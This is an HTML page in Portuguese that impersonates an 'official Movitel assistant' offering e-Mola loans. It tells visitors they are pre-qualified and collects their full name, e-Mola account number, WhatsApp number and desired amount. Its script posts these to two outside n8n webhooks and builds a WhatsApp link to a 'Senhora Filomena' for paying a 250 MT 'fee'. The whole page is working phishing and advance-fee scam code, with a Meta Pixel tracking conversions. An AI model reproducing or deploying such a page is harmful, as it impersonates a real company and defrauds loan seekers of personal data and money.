<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Txuna e-Mola ‚Äì Solicita√ß√£o</title>

  <!-- Meta Pixel Code -->
  <script>
    !function(f,b,e,v,n,t,s){
      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)n=f.fbq;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      'https://connect.facebook.net/en_US/fbevents.js');
      fbq('init', '4179716432354886');
      fbq('track', 'PageView');
    </script>
  <!-- End Meta Pixel Code -->

  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: url("https://www.menosfios.com/wp-content/uploads/2023/07/16945302_605.jpg") no-repeat center center/cover;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; margin: 0; position: relative;
    }
    body::before {
      content:""; position:absolute; inset:0;
      background: rgba(255,255,255,0.25);
      backdrop-filter: blur(6px);
    }
    .container {
      position: relative; z-index: 2;
      background: rgba(255,255,255,0.95);
      border-radius: 18px;
      padding: 28px; max-width: 500px; width: 92%;
      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
      animation: fadeIn 0.8s ease;
    }
    @keyframes fadeIn {from{opacity:0; transform:translateY(20px);}to{opacity:1; transform:translateY(0);}}
    h2 { color:#FF6600; text-align:center; margin-bottom:15px; }
    p { color:#444; font-size:15px; line-height:1.5; }
    label { display:block; margin:12px 0 6px; font-weight:600; }
    input {
      width:100%; padding:12px; border:1px solid #ddd; border-radius:8px;
      font-size:15px; margin-bottom:10px;
    }
    .btn {
      display:block; width:100%; padding:14px;
      border:0; border-radius:12px;
      background:linear-gradient(135deg,#FF6600,#ff944d);
      color:#fff; font-weight:600; font-size:16px; cursor:pointer;
      box-shadow:0 4px 12px rgba(255,102,0,0.3); transition:all .3s;
      margin-top:15px;
    }
    .btn:hover { transform:translateY(-2px); }

    /* Overlay */
    .overlay {
      position:fixed; inset:0; background:rgba(0,0,0,0.6);
      display:none; align-items:center; justify-content:center;
      z-index:10;
    }
    .popup {
      background:#fff; border-radius:16px;
      padding:25px; max-width:380px; text-align:center;
      box-shadow:0 10px 30px rgba(0,0,0,0.3);
      animation: popupAnim 0.5s ease;
    }
    @keyframes popupAnim {from{transform:scale(0.8);opacity:0;}to{transform:scale(1);opacity:1;}}
    .popup h3 { margin:0 0 10px; color:#FF6600; }
    .popup p { font-size:15px; margin-bottom:18px; }
    .popup button, .popup a {
      display:inline-block; text-decoration:none;
      background:#28a745; color:#fff; padding:12px 20px;
      border-radius:10px; font-weight:600;
      transition:background .3s;
    }
    .popup a:hover { background:#218838; }
    .popup button { background:#FF6600; margin-top:12px; }
    .popup button:hover { background:#e65c00; }

    /* Loader */
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #FF6600;
      border-radius: 50%;
      width: 50px; height: 50px;
      animation: spin 1s linear infinite;
      margin: auto;
    }
    @keyframes spin { 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container" id="formContainer">
    <h2>üîí Assistente Oficial Movitel ‚Äì Txuna e-Mola</h2>
    <p>üéâ Voc√™ j√° est√° pr√©-qualificado. Preencha os dados abaixo para processarmos sua solicita√ß√£o.</p>

    <form id="emprestimoForm">
      <label>Nome completo</label>
      <input type="text" id="nome" required>

      <label>N√∫mero de Conta (e-Mola)</label>
      <input type="text" id="numero" placeholder="Ex: 843456789" required>

      <label>N√∫mero de WhatsApp</label>
      <input type="text" id="whatsapp" placeholder="Ex: 84xxxxxxx" required>

      <label>Valor desejado (m√≠n. 5000 ‚Äì m√°x. 25000 MT)</label>
      <input type="number" id="valor" min="5000" max="50000" required>

      <button type="submit" class="btn">Confirmar Dados</button>
    </form>
  </div>

  <!-- Popup erro -->
  <div class="overlay" id="popupErro">
    <div class="popup">
      <h3>‚ö†Ô∏è Aten√ß√£o</h3>
      <p>Este valor n√£o est√° dispon√≠vel.<br>O m√°ximo √© <b>25.000 MT</b>.</p>
      <button onclick="fecharPopup('popupErro')">Fechar</button>
    </div>
  </div>

  <!-- Popup processando -->
  <div class="overlay" id="popupProcessando">
    <div class="popup">
      <div class="loader"></div>
      <p>Processando seus dados, aguarde...</p>
    </div>
  </div>

  <!-- Popup escolha prazo -->
  <div class="overlay" id="popupPrazo">
    <div class="popup">
      <h3>üìÖ Escolha o Prazo</h3>
      <p>Em quantos anos deseja pagar?</p>
      <button onclick="calcularPrestacao(5)">5 anos</button>
      <button onclick="calcularPrestacao(10)">10 anos</button>
      <button onclick="calcularPrestacao(15)">15 anos</button>
    </div>
  </div>

  <!-- Popup sucesso -->
  <div class="overlay" id="popupSucesso">
    <div class="popup">
      <h3>‚úÖ Dados Confirmados</h3>
      <p id="msgSucesso"></p>
      <p id="msgPrestacao"></p>
      <p>Para finalizar, efetue o pagamento da taxa <b></b>.<br>
      Clique abaixo para concluir com a Senhora Filomena (Assistente Oficial).</p>
      <a id="btnWhatsApp" href="#" target="_blank" 
         onclick="fbq('track','InitiateCheckout');">
        üí¨ Finalizar com Filomena
      </a>
    </div>
  </div>

<script>
  let nome, numero, whatsapp, valor;

  const form = document.getElementById("emprestimoForm");
  const popupErro = document.getElementById("popupErro");
  const popupSucesso = document.getElementById("popupSucesso");
  const popupPrazo = document.getElementById("popupPrazo");
  const popupProcessando = document.getElementById("popupProcessando");
  const msgSucesso = document.getElementById("msgSucesso");
  const msgPrestacao = document.getElementById("msgPrestacao");

  form.addEventListener("submit", function(e){
    e.preventDefault();
    nome = document.getElementById("nome").value.trim();
    numero = document.getElementById("numero").value.trim().replace(/\D/g,"");
    whatsapp = document.getElementById("whatsapp").value.trim().replace(/\D/g,"");
    valor = parseInt(document.getElementById("valor").value);

    if(!numero.startsWith("258")) numero = "258" + numero;
    if(!whatsapp.startsWith("258")) whatsapp = "258" + whatsapp;

    if(valor > 25000){
      popupErro.style.display = "flex";
      return;
    }
    if(valor < 5000){
      alert("O valor m√≠nimo √© 5000 MT.");
      return;
    }

    popupProcessando.style.display = "flex";
    setTimeout(()=>{
      popupProcessando.style.display = "none";
      popupPrazo.style.display = "flex";
    }, 2000);
  });

  async function calcularPrestacao(anos){
    let meses = anos * 12;
    let mensal = Math.round(valor / meses);

    msgSucesso.innerHTML = `Parab√©ns ${nome}! üéâ<br>
    Vais receber <b>${valor} MT</b> na conta <b>${numero}</b>.<br>
    üì± Contato WhatsApp: <b>${whatsapp}</b>`;
    msgPrestacao.innerHTML = `üìÖ Prazo escolhido: ${anos} anos (${meses} meses)<br>
    üí∞ Presta√ß√£o mensal aproximada: <b>${mensal} MT/m√™s</b>`;

    // Monta mensagem din√¢mica para WhatsApp
    let mensagem = `Eu sou ${nome}! üéâ%0A` +
      `Quero receber ${valor} MT na conta ${numero}.%0A` +
      `üì± Contato WhatsApp: ${whatsapp}%0A%0A` +
      `üìÖ Prazo escolhido: ${anos} anos (${meses} meses)%0A` +
      `üí∞ Presta√ß√£o mensal aproximada: ${mensal} MT/m√™s%0A%0A` +
      `Quero, efetuar o pagamento da taxa de 250 MT.%0A` +
      ``;

    document.querySelector("#btnWhatsApp").href =
      `https://wa.me/258872283022?text=${mensagem}`;

    // Envia para webhooks
    let payload = new URLSearchParams();
    payload.append("sessionId", numero);
    payload.append("nome", nome);
    payload.append("numero", numero);
    payload.append("whatsapp", whatsapp);
    payload.append("valor", valor);
    payload.append("prazoEscolhido", anos);
    payload.append("meses", meses);
    payload.append("prestacaoMensal", mensal);
    payload.append("timestamp", new Date().toISOString());

    try {
      await Promise.all([
        fetch("https://n8n.ejss.space/webhook/txunaemola", {
          method: "POST",
          headers: {"Content-Type": "application/x-www-form-urlencoded"},
          body: payload,
          mode: "no-cors"
        }),
        fetch("https://n8n.ejss.space/webhook/txunaemolaa", {
          method: "POST",
          headers: {"Content-Type": "application/x-www-form-urlencoded"},
          body: payload,
          mode: "no-cors"
        })
      ]);
    } catch(err){
      console.error("Erro envio:", err);
    }

    popupPrazo.style.display = "none";
    popupSucesso.style.display = "flex";
  }

  function fecharPopup(id){
    document.getElementById(id).style.display = "none";
  }
</script>
</body>
</html>
